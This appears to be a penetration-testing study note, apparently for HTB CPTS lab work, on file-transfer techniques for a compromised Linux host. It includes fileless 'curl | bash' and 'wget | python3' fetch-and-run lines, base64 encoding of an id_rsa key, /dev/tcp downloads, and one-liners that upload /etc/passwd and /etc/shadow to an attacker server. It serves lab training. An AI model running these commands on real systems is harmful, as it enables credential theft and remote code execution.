---
tags:
  - 渗透/利用
  - IT/Linux
  - 渗透/CPTS
  - 渗透/后渗透
---

## Download

### Base64 Encoding / Decoding

```bash
# Encoding
cat id_rsa |base64 -w 0;echo (或 base64 id_rsa -w 0)

# Decoding
echo -n <base64-sting> | base64 -d > id_rsa
```
 - 注意传输前后确认MD5以保证文件正确传输：`md5sum id_rsa`


### Web Downloads with Wget and cURL

一般：`wget`和`curl`直接下载。

#### Fileless Download with cURL

`curl <url/shell.sh> | bash`
#### Fileless Download with wget

`wget -qO- <url/shell.py> | python3`

- `-O-`：output到标准输出。


### Bash (/dev/tcp)

> As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

#### Connect to the Target Webserver

```shell-session
TimeLess613@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```
- `<>`：双向（或双向读写）重定向
- `3<>`：打开文件描述符3同时进行读取和写入操作


#### HTTP GET Request

```shell-session
TimeLess613@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the Response

```shell-session
TimeLess613@htb[/htb]$ cat <&3
```


### with code

python：
```shell-session
TimeLess613@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

PHP

Ruby

JavaScript and cscript.exe ([based on this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068))
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```cmd-session
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```


VBScript and cscript.exe ([based on this](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs))




### scp

> [!note] **Note:** You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.








## Upload



### Web Upload

#### Create a Self-Signed Certificate

```shell-session
TimeLess613@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

#### Start Web Server

> [!note] The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

```shell-session
TimeLess613@htb[/htb]$ mkdir https && cd https

TimeLess613@htb[/htb]$ sudo python3 -m pip install --user uploadserver
TimeLess613@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```


#### Upload 

```shell
# One-liner
TimeLess613@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'

# Multiple Files
TimeLess613@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
- `--insecure`：因为用的自签名证书。




### scp





## Misc




### LOL

> To search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can use `+file download` or `+file upload`.

